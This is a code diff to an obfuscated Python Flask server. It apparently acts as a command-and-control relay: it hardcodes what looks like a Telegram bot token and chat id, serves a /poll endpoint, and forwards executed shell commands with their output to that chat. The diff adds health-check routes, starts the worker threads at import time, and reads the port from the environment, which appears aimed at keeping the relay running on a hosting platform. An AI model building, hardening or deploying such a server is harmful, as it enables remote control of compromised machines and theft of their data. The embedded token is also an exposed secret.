@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 from flask import Flask, request, jsonify
-import threading, time, requests
+import threading, time, requests, os
 
 _q7x = "8986574707:AAELNac5P_5UHCiaPw1DFmsuk143vyMvF3w"
 _k2m = 6331040638
@@ -10,6 +10,14 @@ _w4n = Flask(__name__)
 _t6p = []
 _r8s = []
 _l3k = threading.Lock()
+
+@_w4n.route("/health")
+def _h0a():
+    return "ok"
+
+@_w4n.route("/")
+def _h0b():
+    return "alive"
 
 @_w4n.route("/poll")
 def _p1a():
@@ -77,8 +85,10 @@ def _p4w():
         for _x2c in _b9n:
             _s3f(f"$ {_x2c['cmd']}\n{_x2c['out']}")
 
+threading.Thread(target=_t9h, daemon=True).start()
+threading.Thread(target=_p4w, daemon=True).start()
+
 if __name__ == "__main__":
-    threading.Thread(target=_t9h, daemon=True).start()
-    threading.Thread(target=_p4w, daemon=True).start()
-    print("[+] server started")
-    _w4n.run(host="0.0.0.0", port=8080, debug=False)
+    _prt = int(os.environ.get("PORT", 8080))
+    print("[+] server started on port", _prt)
+    _w4n.run(host="0.0.0.0", port=_prt, debug=False)
